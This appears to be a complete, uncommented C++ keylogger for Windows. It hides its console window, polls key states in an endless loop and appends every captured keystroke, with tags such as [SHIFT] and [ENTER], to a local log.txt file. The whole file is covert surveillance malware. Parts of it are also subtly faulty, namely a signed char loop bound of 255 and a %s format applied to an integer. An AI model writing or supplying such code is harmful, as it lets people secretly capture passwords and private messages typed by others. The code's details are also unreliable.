#include<iostream>
#include<windows.h>
using namespace std;

int save(int _key, char *file);

int main()
{
    FreeConsole();
    char i;
    while(true){
        Sleep(10);
        for(i=8;i<=255;i++){
            if(GetAsyncKeyState(i)==-32767){
                save(i,"log.txt");
            }
        }
    }
    return 0;
}

int save(int _key,char *file){
    cout<<_key<<endl;
    Sleep(10);
    FILE *OUTPUT_FILE;
    OUTPUT_FILE=fopen(file,"a+");
    if (_key == VK_SHIFT)
        fprintf(OUTPUT_FILE,"%s","[SHIFT]");
    else if (_key == VK_BACK)
        fprintf(OUTPUT_FILE,"%s","[BACK]");
    else if (_key == VK_LBUTTON)
        fprintf(OUTPUT_FILE,"%s","[LBUTTON]");
    else if (_key == VK_RETURN)
        fprintf(OUTPUT_FILE,"%s","[ENTER]");
    else if (_key == VK_ESCAPE)
        fprintf(OUTPUT_FILE,"%s","[ESCAPE]");
    else
        fprintf(OUTPUT_FILE,"%s", &_key);
    fclose(OUTPUT_FILE);
    return 0;
}
